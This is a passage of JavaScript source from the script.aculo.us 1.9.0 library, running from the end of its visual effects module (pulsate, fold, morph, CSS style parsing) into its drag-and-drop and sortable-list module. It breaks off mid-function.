      new Effect.Scale(element, window.opera ? 1 : 0, { sync: true, transition: options.scaleTransition, restoreAfterFinish: true}),
      new Effect.Move(element, { x: moveX, y: moveY, sync: true, transition: options.moveTransition })
    ], Object.extend({
         beforeStartInternal: function(effect) {
           effect.effects[0].element.makePositioned().makeClipping();
         },
         afterFinishInternal: function(effect) {
           effect.effects[0].element.hide().undoClipping().undoPositioned().setStyle(oldStyle); }
       }, options)
  );
};

Effect.Pulsate = function(element) {
  element = $(element);
  var options    = arguments[1] || { },
    oldOpacity = element.getInlineOpacity(),
    transition = options.transition || Effect.Transitions.linear,
    reverser   = function(pos){
      return 1 - transition((-Math.cos((pos*(options.pulses||5)*2)*Math.PI)/2) + .5);
    };

  return new Effect.Opacity(element,
    Object.extend(Object.extend({  duration: 2.0, from: 0,
      afterFinishInternal: function(effect) { effect.element.setStyle({opacity: oldOpacity}); }
    }, options), {transition: reverser}));
};

Effect.Fold = function(element) {
  element = $(element);
  var oldStyle = {
    top: element.style.top,
    left: element.style.left,
    width: element.style.width,
    height: element.style.height };
  element.makeClipping();
  return new Effect.Scale(element, 5, Object.extend({
    scaleContent: false,
    scaleX: false,
    afterFinishInternal: function(effect) {
    new Effect.Scale(element, 1, {
      scaleContent: false,
      scaleY: false,
      afterFinishInternal: function(effect) {
        effect.element.hide().undoClipping().setStyle(oldStyle);
      } });
  }}, arguments[1] || { }));
};

Effect.Morph = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({
      style: { }
    }, arguments[1] || { });

    if (!Object.isString(options.style)) this.style = $H(options.style);
    else {
      if (options.style.include(':'))
        this.style = options.style.parseStyle();
      else {
        this.element.addClassName(options.style);
        this.style = $H(this.element.getStyles());
        this.element.removeClassName(options.style);
        var css = this.element.getStyles();
        this.style = this.style.reject(function(style) {
          return style.value == css[style.key];
        });
        options.afterFinishInternal = function(effect) {
          effect.element.addClassName(effect.options.style);
          effect.transforms.each(function(transform) {
            effect.element.style[transform.style] = '';
          });
        };
      }
    }
    this.start(options);
  },

  setup: function(){
    function parseColor(color){
      if (!color || ['rgba(0, 0, 0, 0)','transparent'].include(color)) color = '#ffffff';
      color = color.parseColor();
      return $R(0,2).map(function(i){
        return parseInt( color.slice(i*2+1,i*2+3), 16 );
      });
    }
    this.transforms = this.style.map(function(pair){
      var property = pair[0], value = pair[1], unit = null;

      if (value.parseColor('#zzzzzz') != '#zzzzzz') {
        value = value.parseColor();
        unit  = 'color';
      } else if (property == 'opacity') {
        value = parseFloat(value);
        if (Prototype.Browser.IE && (!this.element.currentStyle.hasLayout))
          this.element.setStyle({zoom: 1});
      } else if (Element.CSS_LENGTH.test(value)) {
          var components = value.match(/^([\+\-]?[0-9\.]+)(.*)$/);
          value = parseFloat(components[1]);
          unit = (components.length == 3) ? components[2] : null;
      }

      var originalValue = this.element.getStyle(property);
      return {
        style: property.camelize(),
        originalValue: unit=='color' ? parseColor(originalValue) : parseFloat(originalValue || 0),
        targetValue: unit=='color' ? parseColor(value) : value,
        unit: unit
      };
    }.bind(this)).reject(function(transform){
      return (
        (transform.originalValue == transform.targetValue) ||
        (
          transform.unit != 'color' &&
          (isNaN(transform.originalValue) || isNaN(transform.targetValue))
        )
      );
    });
  },
  update: function(position) {
    var style = { }, transform, i = this.transforms.length;
    while(i--)
      style[(transform = this.transforms[i]).style] =
        transform.unit=='color' ? '#'+
          (Math.round(transform.originalValue[0]+
            (transform.targetValue[0]-transform.originalValue[0])*position)).toColorPart() +
          (Math.round(transform.originalValue[1]+
            (transform.targetValue[1]-transform.originalValue[1])*position)).toColorPart() +
          (Math.round(transform.originalValue[2]+
            (transform.targetValue[2]-transform.originalValue[2])*position)).toColorPart() :
        (transform.originalValue +
          (transform.targetValue - transform.originalValue) * position).toFixed(3) +
            (transform.unit === null ? '' : transform.unit);
    this.element.setStyle(style, true);
  }
});

Effect.Transform = Class.create({
  initialize: function(tracks){
    this.tracks  = [];
    this.options = arguments[1] || { };
    this.addTracks(tracks);
  },
  addTracks: function(tracks){
    tracks.each(function(track){
      track = $H(track);
      var data = track.values().first();
      this.tracks.push($H({
        ids:     track.keys().first(),
        effect:  Effect.Morph,
        options: { style: data }
      }));
    }.bind(this));
    return this;
  },
  play: function(){
    return new Effect.Parallel(
      this.tracks.map(function(track){
        var ids = track.get('ids'), effect = track.get('effect'), options = track.get('options');
        var elements = [$(ids) || $$(ids)].flatten();
        return elements.map(function(e){ return new effect(e, Object.extend({ sync:true }, options)) });
      }).flatten(),
      this.options
    );
  }
});

Element.CSS_PROPERTIES = $w(
  'backgroundColor backgroundPosition borderBottomColor borderBottomStyle ' +
  'borderBottomWidth borderLeftColor borderLeftStyle borderLeftWidth ' +
  'borderRightColor borderRightStyle borderRightWidth borderSpacing ' +
  'borderTopColor borderTopStyle borderTopWidth bottom clip color ' +
  'fontSize fontWeight height left letterSpacing lineHeight ' +
  'marginBottom marginLeft marginRight marginTop markerOffset maxHeight '+
  'maxWidth minHeight minWidth opacity outlineColor outlineOffset ' +
  'outlineWidth paddingBottom paddingLeft paddingRight paddingTop ' +
  'right textIndent top width wordSpacing zIndex');

Element.CSS_LENGTH = /^(([\+\-]?[0-9\.]+)(em|ex|px|in|cm|mm|pt|pc|\%))|0$/;

String.__parseStyleElement = document.createElement('div');
String.prototype.parseStyle = function(){
  var style, styleRules = $H();
  if (Prototype.Browser.WebKit)
    style = new Element('div',{style:this}).style;
  else {
    String.__parseStyleElement.innerHTML = '<div style="' + this + '"></div>';
    style = String.__parseStyleElement.childNodes[0].style;
  }

  Element.CSS_PROPERTIES.each(function(property){
    if (style[property]) styleRules.set(property, style[property]);
  });

  if (Prototype.Browser.IE && this.include('opacity'))
    styleRules.set('opacity', this.match(/opacity:\s*((?:0|1)?(?:\.\d*)?)/)[1]);

  return styleRules;
};

if (document.defaultView && document.defaultView.getComputedStyle) {
  Element.getStyles = function(element) {
    var css = document.defaultView.getComputedStyle($(element), null);
    return Element.CSS_PROPERTIES.inject({ }, function(styles, property) {
      styles[property] = css[property];
      return styles;
    });
  };
} else {
  Element.getStyles = function(element) {
    element = $(element);
    var css = element.currentStyle, styles;
    styles = Element.CSS_PROPERTIES.inject({ }, function(results, property) {
      results[property] = css[property];
      return results;
    });
    if (!styles.opacity) styles.opacity = element.getOpacity();
    return styles;
  };
}

Effect.Methods = {
  morph: function(element, style) {
    element = $(element);
    new Effect.Morph(element, Object.extend({ style: style }, arguments[2] || { }));
    return element;
  },
  visualEffect: function(element, effect, options) {
    element = $(element);
    var s = effect.dasherize().camelize(), klass = s.charAt(0).toUpperCase() + s.substring(1);
    new Effect[klass](element, options);
    return element;
  },
  highlight: function(element, options) {
    element = $(element);
    new Effect.Highlight(element, options);
    return element;
  }
};

$w('fade appear grow shrink fold blindUp blindDown slideUp slideDown '+
  'pulsate shake puff squish switchOff dropOut').each(
  function(effect) {
    Effect.Methods[effect] = function(element, options){
      element = $(element);
      Effect[effect.charAt(0).toUpperCase() + effect.substring(1)](element, options);
      return element;
    };
  }
);

$w('getInlineOpacity forceRerendering setContentZoom collectTextNodes collectTextNodesIgnoreClass getStyles').each(
  function(f) { Effect.Methods[f] = Element[f]; }
);

Element.addMethods(Effect.Methods);
// script.aculo.us dragdrop.js v1.9.0, Thu Dec 23 16:54:48 -0500 2010

// Copyright (c) 2005-2010 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

if(Object.isUndefined(Effect))
  throw("dragdrop.js requires including script.aculo.us' effects.js library");

var Droppables = {
  drops: [],

  remove: function(element) {
    this.drops = this.drops.reject(function(d) { return d.element==$(element) });
  },

  add: function(element) {
    element = $(element);
    var options = Object.extend({
      greedy:     true,
      hoverclass: null,
      tree:       false
    }, arguments[1] || { });

    // cache containers
    if(options.containment) {
      options._containers = [];
      var containment = options.containment;
      if(Object.isArray(containment)) {
        containment.each( function(c) { options._containers.push($(c)) });
      } else {
        options._containers.push($(containment));
      }
    }

    if(options.accept) options.accept = [options.accept].flatten();

    Element.makePositioned(element); // fix IE
    options.element = element;

    this.drops.push(options);
  },

  findDeepestChild: function(drops) {
    deepest = drops[0];

    for (i = 1; i < drops.length; ++i)
      if (Element.isParent(drops[i].element, deepest.element))
        deepest = drops[i];

    return deepest;
  },

  isContained: function(element, drop) {
    var containmentNode;
    if(drop.tree) {
      containmentNode = element.treeNode;
    } else {
      containmentNode = element.parentNode;
    }
    return drop._containers.detect(function(c) { return containmentNode == c });
  },

  isAffected: function(point, element, drop) {
    return (
      (drop.element!=element) &&
      ((!drop._containers) ||
        this.isContained(element, drop)) &&
      ((!drop.accept) ||
        (Element.classNames(element).detect(
          function(v) { return drop.accept.include(v) } ) )) &&
      Position.within(drop.element, point[0], point[1]) );
  },

  deactivate: function(drop) {
    if(drop.hoverclass)
      Element.removeClassName(drop.element, drop.hoverclass);
    this.last_active = null;
  },

  activate: function(drop) {
    if(drop.hoverclass)
      Element.addClassName(drop.element, drop.hoverclass);
    this.last_active = drop;
  },

  show: function(point, element) {
    if(!this.drops.length) return;
    var drop, affected = [];

    this.drops.each( function(drop) {
      if(Droppables.isAffected(point, element, drop))
        affected.push(drop);
    });

    if(affected.length>0)
      drop = Droppables.findDeepestChild(affected);

    if(this.last_active && this.last_active != drop) this.deactivate(this.last_active);
    if (drop) {
      Position.within(drop.element, point[0], point[1]);
      if(drop.onHover)
        drop.onHover(element, drop.element, Position.overlap(drop.overlap, drop.element));

      if (drop != this.last_active) Droppables.activate(drop);
    }
  },

  fire: function(event, element) {
    if(!this.last_active) return;
    Position.prepare();

    if (this.isAffected([Event.pointerX(event), Event.pointerY(event)], element, this.last_active))
      if (this.last_active.onDrop) {
        this.last_active.onDrop(element, this.last_active.element, event);
        return true;
      }
  },

  reset: function() {
    if(this.last_active)
      this.deactivate(this.last_active);
  }
};

var Draggables = {
  drags: [],
  observers: [],

  register: function(draggable) {
    if(this.drags.length == 0) {
      this.eventMouseUp   = this.endDrag.bindAsEventListener(this);
      this.eventMouseMove = this.updateDrag.bindAsEventListener(this);
      this.eventKeypress  = this.keyPress.bindAsEventListener(this);

      Event.observe(document, "mouseup", this.eventMouseUp);
      Event.observe(document, "mousemove", this.eventMouseMove);
      Event.observe(document, "keypress", this.eventKeypress);
    }
    this.drags.push(draggable);
  },

  unregister: function(draggable) {
    this.drags = this.drags.reject(function(d) { return d==draggable });
    if(this.drags.length == 0) {
      Event.stopObserving(document, "mouseup", this.eventMouseUp);
      Event.stopObserving(document, "mousemove", this.eventMouseMove);
      Event.stopObserving(document, "keypress", this.eventKeypress);
    }
  },

  activate: function(draggable) {
    if(draggable.options.delay) {
      this._timeout = setTimeout(function() {
        Draggables._timeout = null;
        window.focus();
        Draggables.activeDraggable = draggable;
      }.bind(this), draggable.options.delay);
    } else {
      window.focus(); // allows keypress events if window isn't currently focused, fails for Safari
      this.activeDraggable = draggable;
    }
  },

  deactivate: function() {
    this.activeDraggable = null;
  },

  updateDrag: function(event) {
    if(!this.activeDraggable) return;
    var pointer = [Event.pointerX(event), Event.pointerY(event)];
    // Mozilla-based browsers fire successive mousemove events with
    // the same coordinates, prevent needless redrawing (moz bug?)
    if(this._lastPointer && (this._lastPointer.inspect() == pointer.inspect())) return;
    this._lastPointer = pointer;

    this.activeDraggable.updateDrag(event, pointer);
  },

  endDrag: function(event) {
    if(this._timeout) {
      clearTimeout(this._timeout);
      this._timeout = null;
    }
    if(!this.activeDraggable) return;
    this._lastPointer = null;
    this.activeDraggable.endDrag(event);
    this.activeDraggable = null;
  },

  keyPress: function(event) {
    if(this.activeDraggable)
      this.activeDraggable.keyPress(event);
  },

  addObserver: function(observer) {
    this.observers.push(observer);
    this._cacheObserverCallbacks();
  },

  removeObserver: function(element) {  // element instead of observer fixes mem leaks
    this.observers = this.observers.reject( function(o) { return o.element==element });
    this._cacheObserverCallbacks();
  },

  notify: function(eventName, draggable, event) {  // 'onStart', 'onEnd', 'onDrag'
    if(this[eventName+'Count'] > 0)
      this.observers.each( function(o) {
        if(o[eventName]) o[eventName](eventName, draggable, event);
      });
    if(draggable.options[eventName]) draggable.options[eventName](draggable, event);
  },

  _cacheObserverCallbacks: function() {
    ['onStart','onEnd','onDrag'].each( function(eventName) {
      Draggables[eventName+'Count'] = Draggables.observers.select(
        function(o) { return o[eventName]; }
      ).length;
    });
  }
};

/*--------------------------------------------------------------------------*/

var Draggable = Class.create({
  initialize: function(element) {
    var defaults = {
      handle: false,
      reverteffect: function(element, top_offset, left_offset) {
        var dur = Math.sqrt(Math.abs(top_offset^2)+Math.abs(left_offset^2))*0.02;
        new Effect.Move(element, { x: -left_offset, y: -top_offset, duration: dur,
          queue: {scope:'_draggable', position:'end'}
        });
      },
      endeffect: function(element) {
        var toOpacity = Object.isNumber(element._opacity) ? element._opacity : 1.0;
        new Effect.Opacity(element, {duration:0.2, from:0.7, to:toOpacity,
          queue: {scope:'_draggable', position:'end'},
          afterFinish: function(){
            Draggable._dragging[element] = false
          }
        });
      },
      zindex: 1000,
      revert: false,
      quiet: false,
      scroll: false,
      scrollSensitivity: 20,
      scrollSpeed: 15,
      snap: false,  // false, or xy or [x,y] or function(x,y){ return [x,y] }
      delay: 0
    };

    if(!arguments[1] || Object.isUndefined(arguments[1].endeffect))
      Object.extend(defaults, {
        starteffect: function(element) {
          element._opacity = Element.getOpacity(element);
          Draggable._dragging[element] = true;
          new Effect.Opacity(element, {duration:0.2, from:element._opacity, to:0.7});
        }
      });

    var options = Object.extend(defaults, arguments[1] || { });

    this.element = $(element);

    if(options.handle && Object.isString(options.handle))
      this.handle = this.element.down('.'+options.handle, 0);

    if(!this.handle) this.handle = $(options.handle);
    if(!this.handle) this.handle = this.element;

    if(options.scroll && !options.scroll.scrollTo && !options.scroll.outerHTML) {
      options.scroll = $(options.scroll);
      this._isScrollChild = Element.childOf(this.element, options.scroll);
    }

    Element.makePositioned(this.element); // fix IE

    this.options  = options;
    this.dragging = false;

    this.eventMouseDown = this.initDrag.bindAsEventListener(this);
    Event.observe(this.handle, "mousedown", this.eventMouseDown);

    Draggables.register(this);
  },

  destroy: function() {
    Event.stopObserving(this.handle, "mousedown", this.eventMouseDown);
    Draggables.unregister(this);
  },

  currentDelta: function() {
    return([
      parseInt(Element.getStyle(this.element,'left') || '0'),
      parseInt(Element.getStyle(this.element,'top') || '0')]);
  },

  initDrag: function(event) {
    if(!Object.isUndefined(Draggable._dragging[this.element]) &&
      Draggable._dragging[this.element]) return;
    if(Event.isLeftClick(event)) {
      // abort on form elements, fixes a Firefox issue
      var src = Event.element(event);
      if((tag_name = src.tagName.toUpperCase()) && (
        tag_name=='INPUT' ||
        tag_name=='SELECT' ||
        tag_name=='OPTION' ||
        tag_name=='BUTTON' ||
        tag_name=='TEXTAREA')) return;

      var pointer = [Event.pointerX(event), Event.pointerY(event)];
      var pos     = this.element.cumulativeOffset();
      this.offset = [0,1].map( function(i) { return (pointer[i] - pos[i]) });

      Draggables.activate(this);
      Event.stop(event);
    }
  },

  startDrag: function(event) {
    this.dragging = true;
    if(!this.delta)
      this.delta = this.currentDelta();

    if(this.options.zindex) {
      this.originalZ = parseInt(Element.getStyle(this.element,'z-index') || 0);
      this.element.style.zIndex = this.options.zindex;
    }

    if(this.options.ghosting) {
      this._clone = this.element.cloneNode(true);
      this._originallyAbsolute = (this.element.getStyle('position') == 'absolute');
      if (!this._originallyAbsolute)
        Position.absolutize(this.element);
      this.element.parentNode.insertBefore(this._clone, this.element);
    }

    if(this.options.scroll) {
      if (this.options.scroll == window) {
        var where = this._getWindowScroll(this.options.scroll);
        this.originalScrollLeft = where.left;
        this.originalScrollTop = where.top;
      } else {
        this.originalScrollLeft = this.options.scroll.scrollLeft;
        this.originalScrollTop = this.options.scroll.scrollTop;
      }
    }

    Draggables.notify('onStart', this, event);

    if(this.options.starteffect) this.options.starteffect(this.element);
  },

  updateDrag: function(event, pointer) {
    if(!this.dragging) this.startDrag(event);

    if(!this.options.quiet){
      Position.prepare();
      Droppables.show(pointer, this.element);
    }

    Draggables.notify('onDrag', this, event);

    this.draw(pointer);
    if(this.options.change) this.options.change(this);

    if(this.options.scroll) {
      this.stopScrolling();

      var p;
      if (this.options.scroll == window) {
        with(this._getWindowScroll(this.options.scroll)) { p = [ left, top, left+width, top+height ]; }
      } else {
        p = Position.page(this.options.scroll).toArray();
        p[0] += this.options.scroll.scrollLeft + Position.deltaX;
        p[1] += this.options.scroll.scrollTop + Position.deltaY;
        p.push(p[0]+this.options.scroll.offsetWidth);
        p.push(p[1]+this.options.scroll.offsetHeight);
      }
      var speed = [0,0];
      if(pointer[0] < (p[0]+this.options.scrollSensitivity)) speed[0] = pointer[0]-(p[0]+this.options.scrollSensitivity);
      if(pointer[1] < (p[1]+this.options.scrollSensitivity)) speed[1] = pointer[1]-(p[1]+this.options.scrollSensitivity);
      if(pointer[0] > (p[2]-this.options.scrollSensitivity)) speed[0] = pointer[0]-(p[2]-this.options.scrollSensitivity);
      if(pointer[1] > (p[3]-this.options.scrollSensitivity)) speed[1] = pointer[1]-(p[3]-this.options.scrollSensitivity);
      this.startScrolling(speed);
    }

    // fix AppleWebKit rendering
    if(Prototype.Browser.WebKit) window.scrollBy(0,0);

    Event.stop(event);
  },

  finishDrag: function(event, success) {
    this.dragging = false;

    if(this.options.quiet){
      Position.prepare();
      var pointer = [Event.pointerX(event), Event.pointerY(event)];
      Droppables.show(pointer, this.element);
    }

    if(this.options.ghosting) {
      if (!this._originallyAbsolute)
        Position.relativize(this.element);
      delete this._originallyAbsolute;
      Element.remove(this._clone);
      this._clone = null;
    }

    var dropped = false;
    if(success) {
      dropped = Droppables.fire(event, this.element);
      if (!dropped) dropped = false;
    }
    if(dropped && this.options.onDropped) this.options.onDropped(this.element);
    Draggables.notify('onEnd', this, event);

    var revert = this.options.revert;
    if(revert && Object.isFunction(revert)) revert = revert(this.element);

    var d = this.currentDelta();
    if(revert && this.options.reverteffect) {
      if (dropped == 0 || revert != 'failure')
        this.options.reverteffect(this.element,
          d[1]-this.delta[1], d[0]-this.delta[0]);
    } else {
      this.delta = d;
    }

    if(this.options.zindex)
      this.element.style.zIndex = this.originalZ;

    if(this.options.endeffect)
      this.options.endeffect(this.element);

    Draggables.deactivate(this);
    Droppables.reset();
  },

  keyPress: function(event) {
    if(event.keyCode!=Event.KEY_ESC) return;
    this.finishDrag(event, false);
    Event.stop(event);
  },

  endDrag: function(event) {
    if(!this.dragging) return;
    this.stopScrolling();
    this.finishDrag(event, true);
    Event.stop(event);
  },

  draw: function(point) {
    var pos = this.element.cumulativeOffset();
    if(this.options.ghosting) {
      var r   = Position.realOffset(this.element);
      pos[0] += r[0] - Position.deltaX; pos[1] += r[1] - Position.deltaY;
    }

    var d = this.currentDelta();
    pos[0] -= d[0]; pos[1] -= d[1];

    if(this.options.scroll && (this.options.scroll != window && this._isScrollChild)) {
      pos[0] -= this.options.scroll.scrollLeft-this.originalScrollLeft;
      pos[1] -= this.options.scroll.scrollTop-this.originalScrollTop;
    }

    var p = [0,1].map(function(i){
      return (point[i]-pos[i]-this.offset[i])
    }.bind(this));

    if(this.options.snap) {
      if(Object.isFunction(this.options.snap)) {
        p = this.options.snap(p[0],p[1],this);
      } else {
      if(Object.isArray(this.options.snap)) {
        p = p.map( function(v, i) {
          return (v/this.options.snap[i]).round()*this.options.snap[i] }.bind(this));
      } else {
        p = p.map( function(v) {
          return (v/this.options.snap).round()*this.options.snap }.bind(this));
      }
    }}

    var style = this.element.style;
    if((!this.options.constraint) || (this.options.constraint=='horizontal'))
      style.left = p[0] + "px";
    if((!this.options.constraint) || (this.options.constraint=='vertical'))
      style.top  = p[1] + "px";

    if(style.visibility=="hidden") style.visibility = ""; // fix gecko rendering
  },

  stopScrolling: function() {
    if(this.scrollInterval) {
      clearInterval(this.scrollInterval);
      this.scrollInterval = null;
      Draggables._lastScrollPointer = null;
    }
  },

  startScrolling: function(speed) {
    if(!(speed[0] || speed[1])) return;
    this.scrollSpeed = [speed[0]*this.options.scrollSpeed,speed[1]*this.options.scrollSpeed];
    this.lastScrolled = new Date();
    this.scrollInterval = setInterval(this.scroll.bind(this), 10);
  },

  scroll: function() {
    var current = new Date();
    var delta = current - this.lastScrolled;
    this.lastScrolled = current;
    if(this.options.scroll == window) {
      with (this._getWindowScroll(this.options.scroll)) {
        if (this.scrollSpeed[0] || this.scrollSpeed[1]) {
          var d = delta / 1000;
          this.options.scroll.scrollTo( left + d*this.scrollSpeed[0], top + d*this.scrollSpeed[1] );
        }
      }
    } else {
      this.options.scroll.scrollLeft += this.scrollSpeed[0] * delta / 1000;
      this.options.scroll.scrollTop  += this.scrollSpeed[1] * delta / 1000;
    }

    Position.prepare();
    Droppables.show(Draggables._lastPointer, this.element);
    Draggables.notify('onDrag', this);
    if (this._isScrollChild) {
      Draggables._lastScrollPointer = Draggables._lastScrollPointer || $A(Draggables._lastPointer);
      Draggables._lastScrollPointer[0] += this.scrollSpeed[0] * delta / 1000;
      Draggables._lastScrollPointer[1] += this.scrollSpeed[1] * delta / 1000;
      if (Draggables._lastScrollPointer[0] < 0)
        Draggables._lastScrollPointer[0] = 0;
      if (Draggables._lastScrollPointer[1] < 0)
        Draggables._lastScrollPointer[1] = 0;
      this.draw(Draggables._lastScrollPointer);
    }

    if(this.options.change) this.options.change(this);
  },

  _getWindowScroll: function(w) {
    var T, L, W, H;
    with (w.document) {
      if (w.document.documentElement && documentElement.scrollTop) {
        T = documentElement.scrollTop;
        L = documentElement.scrollLeft;
      } else if (w.document.body) {
        T = body.scrollTop;
        L = body.scrollLeft;
      }
      if (w.innerWidth) {
        W = w.innerWidth;
        H = w.innerHeight;
      } else if (w.document.documentElement && documentElement.clientWidth) {
        W = documentElement.clientWidth;
        H = documentElement.clientHeight;
      } else {
        W = body.offsetWidth;
        H = body.offsetHeight;
      }
    }
    return { top: T, left: L, width: W, height: H };
  }
});

Draggable._dragging = { };

/*--------------------------------------------------------------------------*/

var SortableObserver = Class.create({
  initialize: function(element, observer) {
    this.element   = $(element);
    this.observer  = observer;
    this.lastValue = Sortable.serialize(this.element);
  },

  onStart: function() {
    this.lastValue = Sortable.serialize(this.element);
  },

  onEnd: function() {
    Sortable.unmark();
    if(this.lastValue != Sortable.serialize(this.element))
      this.observer(this.element)
  }
});

var Sortable = {
  SERIALIZE_RULE: /^[^_\-](?:[A-Za-z0-9\-\_]*)[_](.*)$/,

  sortables: { },

  _findRootElement: function(element) {
    while (element.tagName.toUpperCase() != "BODY") {
      if(element.id && Sortable.sortables[element.id]) return element;
      element = element.parentNode;
    }
  },

  options: function(element) {
    element = Sortable._findRootElement($(element));
    if(!element) return;
    return Sortable.sortables[element.id];
  },

  destroy: function(element){
    element = $(element);
    var s = Sortable.sortables[element.id];

    if(s) {
      Draggables.removeObserver(s.element);
      s.droppables.each(function(d){ Droppables.remove(d) });
      s.draggables.invoke('destroy');

      delete Sortable.sortables[s.element.id];
    }
  },

  create: function(element) {
    element = $(element);
    var options = Object.extend({
      element:     element,
      tag:         'li',       // assumes li children, override with tag: 'tagname'
      dropOnEmpty: false,
      tree:        false,
      treeTag:     'ul',
      overlap:     'vertical', // one of 'vertical', 'horizontal'
      constraint:  'vertical', // one of 'vertical', 'horizontal', false
      containment: element,    // also takes array of elements (or id's); or false
      handle:      false,      // or a CSS class
      only:        false,
      delay:       0,
      hoverclass:  null,
      ghosting:    false,
      quiet:       false,
      scroll:      false,
      scrollSensitivity: 20,
      scrollSpeed: 15,
      format:      this.SERIALIZE_RULE,

      // these take arrays of elements or ids and can be
      // used for better initialization performance
      elements:    false,
      handles:     false,

      onChange:    Prototype.emptyFunction,
      onUpdate:    Prototype.emptyFunction
    }, arguments[1] || { });

    // clear any old sortable with same element
    this.destroy(element);

    // build options for the draggables
    var options_for_draggable = {
      revert:      true,
      quiet:       options.quiet,
      scroll:      options.scroll,
      scrollSpeed: options.scrollSpeed,
      scrollSensitivity: options.scrollSensitivity,
      delay:       options.delay,
      ghosting:    options.ghosting,
      constraint:  options.constraint,
      handle:      options.handle };

    if(options.starteffect)
      options_for_draggable.starteffect = options.starteffect;

    if(options.reverteffect)
      options_for_draggable.reverteffect = options.reverteffect;
    else
      if(options.ghosting) options_for_draggable.reverteffect = function(element) {
        element.style.top  = 0;
        element.style.left = 0;
      };

    if(options.endeffect)
      options_for_draggable.endeffect = options.endeffect;

    if(options.zindex)
      options_for_draggable.zindex = options.zindex;

    // build options for the droppables
    var options_for_droppable = {
      overlap:     options.overlap,
      containment: options.containment,
      tree:        options.tree,
      hoverclass:  options.hoverclass,
      onHover:     Sortable.onHover
    };

    var options_for_tree = {
      onHover:      Sortable.onEmptyHover,
      overlap:      options.overlap,
      containment:  options.containment,
      hoverclass:   options.hoverclass
    };

    // fix for gecko engine
    Element.cleanWhitespace(element);

    options.draggables = [];
    options.droppables = [];

    // drop on empty handling
    if(options.dropOnEmpty || options.tree) {
      Droppables.add(element, options_for_tree);
      options.droppables.push(element);
    }

    (options.elements || this.findElements(element, options) || []).each( function(e,i) {
      var handle = options.handles ? $(options.handles[i]) :
        (options.handle ? $(e).select('.' + options.handle)[0] : e);
      options.draggables.push(
        new Draggable(e, Object.extend(options_for_draggable, { handle: handle })));
      Droppables.add(e, options_for_droppable);
      if(options.tree) e.treeNode = element;
      options.droppables.push(e);
    });

    if(options.tree) {
      (Sortable.findTreeElements(element, options) || []).each( function(e) {
        Droppables.add(e, options_for_tree);
        e.treeNode = element;
        options.droppables.push(e);
      });
    }

    // keep reference
    this.sortables[element.identify()] = options;

    // for onupdate
    Draggables.addObserver(new SortableObserver(element, options.onUpdate));

  },

  // return all suitable-for-sortable elements in a guaranteed order
  findElements: function(element, options) {
    return Element.findChildren(
      element, options.only, options.tree ? true : false, options.tag);
  },

  findTreeElements: function(element, options) {
    return Element.findChildren(
      element, options.only, options.tree ? true : false, options.treeTag);
  },

  onHover: function(element, dropon, overlap) {
    if(Element.isParent(dropon, element)) return;

    if(overlap > .33 && overlap < .66 && Sortable.options(dropon).tree) {
      return;
    } else if(overlap>0.5) {
      Sortable.mark(dropon, 'before');
      if(dropon.previousSibling != element) {
        var oldParentNode = element.parentNode;
        element.style.visibility = "hidden"; // fix gecko rendering
        dropon.parentNode.insertBefore(element, dropon);
        if(dropon.parentNode!=oldParentNode)
          Sortable.options(oldParentNode).onChange(element);
        Sortable.options(dropon.parentNode).onChange(element);
      }
    } else {
      Sortable.mark(dropon, 'after');
      var nextElement = dropon.nextSibling || null;
      if(nextElement != element) {
        var oldParentNode = element.parentNode;
        element.style.visibility = "hidden"; // fix gecko rendering
        dropon.parentNode.insertBefore(element, nextElement);
        if(dropon.parentNode!=oldParentNode)
          Sortable.options(oldParentNode).onChange(element);
        Sortable.options(dropon.parentNode).onChange(element);
      }
    }
  },

  onEmptyHover: function(element, dropon, overlap) {
    var oldParentNode = element.parentNode;
    var droponOptions = Sortable.options(dropon);

    if(!Element.isParent(dropon, element)) {
      var index;

      var children = Sortable.findElements(dropon, {tag: droponOptions.tag, only: droponOptions.only});
      var child = null;

      if(children) {
        var offset = Element.offsetSize(dropon, droponOptions.overlap) * (1.0 - overlap);

        for (index = 0; index < children.length; index += 1) {
          if (offset - Element.offsetSize (children[index], droponOptions.overlap) >= 0) {
            offset -= Element.offsetSize (children[index], droponOptions.overlap);
          } else if (offset - (Element.offsetSize (children[index], droponOptions.overlap) / 2) >= 0) {
            child = index + 1 < children.length ? children[index + 1] : null;
            break;
          } else {
            child = children[index];
            break;
          }
        }
      }

      dropon.insertBefore(element, child);

      Sortable.options(oldParentNode).onChange(element);
      droponOptions.onChange(element);
    }
  },

  unmark: function() {
    if(Sortable._marker) Sortable._marker.hide();
  },

  mark: function(dropon, position) {
    // mark on ghosting only
    var sortable = Sortable.options(dropon.parentNode);
    if(sortable && !sortable.ghosting) return;

    if(!Sortable._marker) {
      Sortable._marker =
        ($('dropmarker') || Element.extend(document.createElement('DIV'))).
          hide().addClassName('dropmarker').setStyle({position:'absolute'});
      document.getElementsByTagName("body").item(0).appendChild(Sortable._marker);
    }
    var offsets = dropon.cumulativeOffset();
    Sortable._marker.setStyle({left: offsets[0]+'px', top: offsets[1] + 'px'});

    if(position=='after')
      if(sortable.overlap == 'horizontal')
        Sortable._marker.setStyle({left: (offsets[0]+dropon.clientWidth) + 'px'});
      else
        Sortable._marker.setStyle({top: (offsets[1]+dropon.clientHeight) + 'px'});

    Sortable._marker.show();
  },

  _tree: function(element, options, parent) {
    var children = Sortable.findElements(element, options) || [];

    for (var i = 0; i < children.length; ++i) {
      var match = children[i].id.match(options.format);

      if (!match) continue;

      var child = {
        id: encodeURIComponent(match ? match[1] : null),
        element: element,
        parent: parent,
        children: [],
        position: parent.children.length,
        container: $(children[i]).down(options.treeTag)
      };

      /* Get the element containing the children and recurse over it */
      if (child.container)
        this._tree(child.container, options, child);

      parent.children.push (child);
    }

    return parent;
  },

  tree: function(element) {
    element = $(element);
    var sortableOptions = this.options(element);
    var options = Object.extend({
      tag: sortableOptions.tag,
      treeTag: sortableOptions.treeTag,
      only: sortableOptions.only,
      name: element.id,
      format: sortableOptions.format
    }, arguments[1] || { });

    var root = {
      id: null,
      parent: null,
      children: [],
      container: element,
      position: 0
    };

    return Sortable._tree(element, options, root);
  },

  /* Construct a [i] index for a particular node */
  _constructIndex: function(node) {
    var index = '';
    do {
      if (node.id) index = '[' + node.position + ']' + index;
    } while ((node = node.parent) != null);
    return index;
  },

  sequence: function(element) {
    element = $(element);
    var options = Object.extend(this.options(element), arguments[1] || { });

    return $(this.findElements(element, options) || []).map( function(item) {
